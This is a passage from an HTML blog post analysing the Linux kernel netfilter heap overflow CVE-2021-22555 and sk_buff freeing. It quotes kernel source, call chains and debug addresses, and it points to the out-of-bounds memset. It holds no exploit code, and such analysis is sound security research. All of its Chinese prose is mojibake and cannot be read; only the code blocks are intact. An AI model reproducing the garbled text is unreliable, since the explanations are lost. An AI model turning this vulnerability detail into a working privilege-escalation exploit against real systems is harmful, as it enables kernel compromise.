<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ­£å¸¸çš„<code>kfree</code>å‡½æ•°</p>
</li>
<li><p>é‡Šæ”¾<code>skb</code>éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;kfree_skbmem()</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kfree_skbmem</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line">    <span class="comment">//å…‹éš†ä½“ç›¸å…³çš„,æ²¡æœ‰forkä¹‹ç±»çš„è¯ä¸€èˆ¬ä¸ç”¨å¤ªç®¡çš„</span></span><br><span class="line">    <span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">            <span class="comment">//ç”¨ä¸“é—¨çš„cache(skbuff_head_cache)è¿›è¡Œå›æ”¶</span></span><br><span class="line">            kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">            <span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> fastpath;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">    <span class="comment">//ç”¨ä¸“é—¨çš„cache(skbuff_fclone_cache)è¿›è¡Œå›æ”¶å…‹éš†çš„skb</span></span><br><span class="line">    kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªå°±ä¸å¤ªå¥½åˆ©ç”¨äº†ã€‚</p>
<p>åŒæ ·çš„ï¼Œå½“å…³é—­çš„ä¿¡é“çš„ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>éƒ½ä¼šå¾—åˆ°é‡Šæ”¾</p>
</li>
</ul>

        <h5 id="å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š"></a>å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š</h5>
      <ul>
<li><p>å½“ä»ä¿¡é“ä¸­å°†æŸæ¡æ¶ˆæ¯å…¨éƒ¨è¯»å–å®Œä¹‹åï¼Œä¼šå‘ç”Ÿè¯¥æ¡æ¶ˆæ¯å¯¹åº”çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>çš„å†…å­˜é‡Šæ”¾ï¼Œä¸”<code>sk_buff</code>é‡Šæ”¾åˆ°ä¸“é—¨çš„ç¼“å­˜æ± ä¸­ï¼Œ<code>skb-&gt;data</code>ä½¿ç”¨æ­£å¸¸çš„<code>kfree</code>é‡Šæ”¾</p>
</li>
<li><p>å½“å…³é—­ä¿¡é“ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>éƒ½ä¼šå¾—åˆ°é‡Šæ”¾ï¼Œå…·ä½“çš„è°ƒç”¨é“¾ä¸ºï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close()-&gt;__sock_release()-&gt;unix_release()-&gt;__kfree_skb()</span><br></pre></td></tr></table></div></figure>

<p>åé¢å°±ç±»ä¼¼äº†ã€‚</p>
</li>
</ul>

        <h1 id="ä¸€ã€æ¼æ´åˆ†æ"   >
          <a href="#ä¸€ã€æ¼æ´åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€æ¼æ´åˆ†æ" class="headerlink" title="ä¸€ã€æ¼æ´åˆ†æ"></a>ä¸€ã€æ¼æ´åˆ†æ</h1>
      
        <h2 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2>
      <p>ç”±äºæˆ‘ç¼–è¯‘ç¯å¢ƒçš„æ—¶å€™è€æ˜¯å‡ºé—®é¢˜ï¼ˆåé¢æ‰è§£å†³çš„ï¼‰ï¼Œæ‰€ä»¥ç›´æ¥æ‹¿<code>bsauce</code>å¸ˆå‚…æä¾›çš„ç¯å¢ƒæ¥ç”¨äº†ï¼Œä½†æ˜¯åˆæ²¡æœ‰å¸¦DEBUGçš„<code>vmlinux</code>ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf.git" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ç®€å•è·å–ä¸‹ç¬¦å·å°±å¼€å§‹é€†å‘äº†(xs)ï¼Œæ‰€ä»¥ä¸‹é¢æ¼æ´åˆ†ææåˆ°çš„åœ°å€ä¸º<code>bsauce</code>å¸ˆå‚…ç¯å¢ƒçš„åœ°å€ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027#h2-1" >CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ç›¸å…³çš„<code>Netfilter</code>åˆ†æå°±ä¸åšäº†ï¼Œä¹Ÿä¸å¤ªä¼šï¼Œå¯ä»¥çœ‹çœ‹<code>bsauce</code>å¸ˆå‚…çš„ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨æ•°æ®çš„ä¼ è¾“è¿‡ç¨‹çš„ä¸€äº›ä¸œè¥¿ã€‚</p>
<p>é€šè¿‡<code>Netfilter</code>çš„<code>setsockopt</code>ç³»ç»Ÿè°ƒç”¨ï¼Œä¼ å…¥ç”¨æˆ·æ•°æ®<code>&amp;data</code>ï¼Œå¯ä¾æ®è¯¥<code>&amp;data</code>ä¸­çš„ç›¸å…³æ•°æ®è¿›è¡Œä¸åŒå¤§å°çš„å †å—ç”³è¯·ã€‚å®Œæˆç”³è¯·åï¼Œè¿˜ä¼šå¯¹è¯¥å †å—è¿›è¡Œä¸€å®šçš„å¤„ç†ï¼Œå…¶ä¸­å°±æœ‰å‘å †å—æœ«å°¾å¡«å……æ•°æ®çš„æ“ä½œã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­<code>t-&gt;data+target-&gt;targetsize</code>å³ä¸ºç”³è¯·çš„å †å—ä¸Šæœ«å°¾å¤„çš„æŸä¸ªåœ°å€ï¼Œ<code>pad</code>ä¸ºå¦‚ä¸‹å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br></pre></td></tr></table></div></figure>

<p>å…¶å®<code>pad</code>çš„å€¼å³ä¸º<code>8 - (target-&gt;targetsize mod 8)</code>ï¼Œå°±æ˜¯æ‰€è°“çš„8å­—èŠ‚å¯¹é½ã€‚</p>
<p>å¹¶ä¸”<code>t-&gt;data</code>çš„åœ°å€åç§»å’Œ<code>target-&gt;targetsize</code>çš„å€¼éƒ½å¯è¢«æˆ‘ä»¬ç›´æ¥æˆ–é—´æ¥åœ°æ§åˆ¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥å­˜åœ¨å †å—æº¢å‡ºå†™0çš„æ“ä½œäº†ï¼Œè¿™é‡Œæœ€å¤šæº¢å‡º4ä¸ªå­—èŠ‚å¡«å……ä¸º0ã€‚</p>
<p>ä¸‹é¢æ˜¯å…·ä½“çš„å…³é”®å‡½æ•°è°ƒç”¨é“¾å’Œç›¸å…³åˆ†æ</p>

        <h2 id="1-nf-setsockopt"   >
          <a href="#1-nf-setsockopt" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-nf-setsockopt" class="headerlink" title="1.nf_setsockopt()"></a>1.nf_setsockopt()</h2>
      <p>å¥æŸ„å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·åˆ°è°ƒç”¨<code>setsockopt</code>ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå°±ä¼šè°ƒç”¨åˆ°<code>do_ipt_get_ctl</code>å‡½æ•°ã€‚</p>

        <h2 id="2-do-ipt-set-ctl"   >
          <a href="#2-do-ipt-set-ctl" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-do-ipt-set-ctl" class="headerlink" title="2.do_ipt_set_ctl()"></a>2.do_ipt_set_ctl()</h2>
      <ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure>

<p>è°ƒè¯•å¦‚ä¸‹<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png" alt="image-20220501113945278"></p>
<p>è¿™ä¸ª<code>&amp;data</code>å³ä¸ºç”¨æˆ·ä¼ å…¥çš„ï¼Œèµ‹å€¼ç»™<code>sockptr_t arg</code>ï¼Œä»è€Œä¾æ®<code>sockptr_t arg</code>æ¥è¿›è¡Œå †å—ç”³è¯·å’Œç›¸å…³çš„æ¼æ´å¡«å……æ“ä½œã€‚</p>
</li>
<li><p>åœ°å€ï¼š<code>0xffffffff81b0bd20</code></p>
</li>
<li><p>ä»‹ç»ï¼šè¯¥å‡½æ•°ç”±<code>nf_sockopt_ops ipt_sockopts</code>è¿›è¡Œå¥æŸ„å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å³ç³»ç»Ÿè°ƒç”¨<code>setsockopt</code>å®é™…è°ƒç”¨åˆ°ä¸æ¼æ´æ–¹é¢æœ‰å…³çš„æœ€æ—©çš„å‡½æ•°ï¼Œä¼ å…¥çš„<code>sockptr_targ</code>å³ä¸ºç”¨æˆ·å‚æ•°<code>&amp;data</code>ï¼Œåç»­ä¼šè°ƒç”¨åˆ°<code>compat_do_replace</code>ï¼Œä¼ å…¥<code>sockptr_t arg</code></p>
</li>
</ul>

        <h2 id="3-compat-do-replace"   >
          <a href="#3-compat-do-replace" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-compat-do-replace" class="headerlink" title="3.compat_do_replace()"></a>3.compat_do_replace()</h2>
      <p>é€šè¿‡<code>_copy_from_user</code>å¤åˆ¶<code>&amp;data</code>çš„<code>0x5c</code>å­—èŠ‚ç»™<code>tmp</code></p>
<ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure></li>
<li><p>åœ°å€ï¼š<code>0xffffffff81b0baf0</code></p>
</li>
<li><p>ä»‹ç»ï¼š</p>
<ul>
<li><p>ä¸»è¦å…³æ³¨å˜é‡ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥çš„</span></span><br><span class="line"><span class="keyword">sockptr_t</span> arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰çš„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> <span class="title">tmp</span>;</span><span class="comment">//ä¿å­˜size</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>è°ƒç”¨<code>translate_compat_table()</code>ï¼Œä¼ å…¥æœ¬å‡½æ•°å®šä¹‰çš„<code>tmp</code>ä½œä¸º<code>compatr</code>ï¼Œè¯¥å˜é‡<code>tmp</code>ç”±å‡½æ•°<code>copy_from_sockptr(&amp;tmp, arg, sizeof(tmp))</code>è¿›è¡Œèµ‹å€¼</p>
<ul>
<li>ç›¸å…³å‡½æ•°é“¾ï¼š<code>copy_from_sockptr-&gt;copy_from_sockptr-&gt;copy_from_sockptr_offset-&gt;copy_from_user</code></li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/sockptr.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">copy_from_sockptr_offset</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">sockptr_t</span> src,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!sockptr_is_kernel(src))</span><br><span class="line">		<span class="keyword">return</span> copy_from_user(dst, src.user + offset, size);</span><br><span class="line">	<span class="built_in">memcpy</span>(dst, src.kernel + offset, size);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„<code>dst</code>å³ä¸º<code>tmp</code>ï¼Œ<code>src</code>å³ä¸º<code>arg</code>ï¼Œä¹Ÿå°±æ˜¯ä¼šä¾æ®<code>arg(&amp;data)</code>çš„å†…å®¹æ¥ç»™<code>tmp</code>èµ‹å€¼ã€‚å³æœ€åçš„<code>compatr</code>çš„æ¥æºä¸ºä¸Šè¿°æåˆ°çš„<code>sockptr_t arg</code>ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°<code>&amp;data</code>ã€‚</p>
<p>ä»<code>&amp;data</code>ä¸­å¤åˆ¶<code>0x5c(sizeof(struct compat_ipt_replace))</code>å¤§å°çš„ç»™åˆ°<code>tmp(compatr)</code>ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function">    <span class="title">compat_do_replace</span><span class="params">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_sockptr(&amp;tmp, arg, <span class="keyword">sizeof</span>(tmp)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">///....</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„tmp.sizeå³ä¸º0xfb6ï¼Œä¼ å…¥çš„data.replace.sizeï¼Œä¹Ÿæ˜¯ç”³è¯·äº†å †å—çš„ã€‚</span></span><br><span class="line">    <span class="comment">//ä¸è¿‡è¿™ä¸ªå †å—ä¸ç”¨å¤ªè¿‡å…³æ³¨ï¼Œä½†æ˜¯è¿™ä¸ªä¸èƒ½éšä¾¿è®¾ç½®ï¼Œä¸ç„¶ä¼šåœ¨å¦‚ä¸‹æ£€æŸ¥å‡ºé”™è¯¯</span></span><br><span class="line">    <span class="comment">//ç„¶åè·³è½¬out_unlockä»è€Œæ— æ³•è¿›å…¥æ¼æ´ç‚¹</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //translate_compat_tableå‡½æ•°ä¸­</span></span><br><span class="line"><span class="comment">    //Walk through entries, checking offsets. </span></span><br><span class="line"><span class="comment">	xt_entry_foreach(iter0, entry0, compatr-&gt;size) &#123;</span></span><br><span class="line"><span class="comment">		ret = check_compat_entry_size_and_hooks(iter0, info, &amp;size,</span></span><br><span class="line"><span class="comment">							entry0,</span></span><br><span class="line"><span class="comment">							entry0 + compatr-&gt;size);</span></span><br><span class="line"><span class="comment">		if (ret != 0)</span></span><br><span class="line"><span class="comment">			goto out_unlock;</span></span><br><span class="line"><span class="comment">		++j;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªnewinfoå’Œä¸‹é¢å‡½æ•°ä¸­çš„newinfoä¸æ˜¯åŒä¸€ä¸ª</span></span><br><span class="line">    newinfo = xt_alloc_table_info(tmp.size);</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    ret = translate_compat_table(net, &amp;newinfo, &amp;loc_cpu_entry, &amp;tmp);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¤åˆ¶çš„è¿™äº›æ•°æ®ä¸­å°±åŒ…å«å®šä¹‰å¥½çš„sizeï¼Œç”¨æ¥å®Œæˆä¹‹åçš„å †å—ç”³è¯·ã€‚</p>
</li>
</ul>

        <h2 id="4-translate-compat-table"   >
          <a href="#4-translate-compat-table" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-translate-compat-table" class="headerlink" title="4.translate_compat_table()"></a>4.translate_compat_table()</h2>
      <ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net,struct xt_table_info **pinfo,<span class="keyword">void</span> **pentry0,<span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br></pre></td></tr></table></div></figure></li>
<li><p>åœ°å€ï¼š<code>0xffffffff81b0b3e0</code></p>
</li>
<li><p>ä»‹ç»ï¼š</p>
<ul>
<li><p>ä¸»è¦å…³æ³¨å˜é‡ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥çš„</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> *<span class="title">compatr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰çš„</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"><span class="keyword">void</span> *pos, *entry1;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_entry</span> *<span class="title">iter0</span>;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p><code>size</code>ï¼š<code>size = compatr-&gt;size;</code></p>
</li>
<li><p><code>newinfo</code>ï¼šä¾æ®<code>size</code>å³ä¸Šè¿°çš„<code>compatr-&gt;size</code>ç”³è¯·å †å—ï¼Œæ¼æ´ç‚¹å°±å‡ºåœ¨è¿™ä¸ªç”³è¯·çš„å †å—ä¸Šé¢ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">translate_compat_table(struct net *net,</span><br><span class="line">                       struct xt_table_info **pinfo,</span><br><span class="line">                       <span class="keyword">void</span> **pentry0,</span><br><span class="line">                       <span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    size = compatr-&gt;size;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªå †å—å°±æ˜¯æ¼æ´å †å—äº†ã€‚</span></span><br><span class="line">    newinfo = xt_alloc_table_info(size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>é€šè¿‡<code>xt_alloc_table_info</code>æ¥ç”³è¯·å †å—ï¼Œå…¶ä¸­æœ‰å¦‚ä¸‹ä»£ç </p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/netfilter/x_tables.c</span></span><br><span class="line"><span class="function">struct xt_table_info *<span class="title">xt_alloc_table_info</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> sz = <span class="keyword">sizeof</span>(*info) + size;<span class="comment">//åŠ ä¸Š0x40å¤§å°</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sz &lt; <span class="keyword">sizeof</span>(*info) || sz &gt;= XT_MAX_TABLE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//å®é™…ç”³è¯·çš„å †å—å¤§å°ä¸º0xffe,å³kmalloc-4096ï¼Œè¿™ä¸ªå †å—å°±æ˜¯æ¼æ´å †å—äº†ã€‚</span></span><br><span class="line">    <span class="comment">//ç»“æ„ä¸ºstruct xt_table_info</span></span><br><span class="line">	info = kvmalloc(sz, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(*info));</span><br><span class="line">	info-&gt;size = size;</span><br><span class="line">	<span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨<code>kvmalloc</code>ï¼Œç”³è¯·æ ‡å¿—ä¸º<code>GFP_KERNEL_ACCOUNT</code>ï¼Œå¹¶ä¸”<code>XT_MAX_TABLE_SIZE</code>å®šä¹‰å¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯åœ¨kmalloc-512åˆ°kmalloc-8192</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define XT_MAX_TABLE_SIZE	(512 * 1024 * 1024)</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>pos/entry1</code>ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry1 = newinfo-&gt;entries;</span><br><span class="line">pos = entry1;</span><br></pre></td></tr></table></div></figure>

<p>å³<code>pos/entry1</code>çš„å€¼ä¸º<code>newinfo_addr+0x40(0x4*3+0x14+0x14+0x4+0x8)</code></p>
</li>
<li><p>è°ƒç”¨å¦‚ä¸‹å‡½æ•°è¿›è¡Œä¸‹ä¸€æ­¥ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(iter0, &amp;pos, &amp;size,</span><br><span class="line">					    newinfo, entry1);</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="5-compat-copy-entry-from-user"   >
          <a href="#5-compat-copy-entry-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-compat-copy-entry-from-user" class="headerlink" title="5.compat_copy_entry_from_user()"></a>5.compat_copy_entry_from_user()</h2>
      <ul>
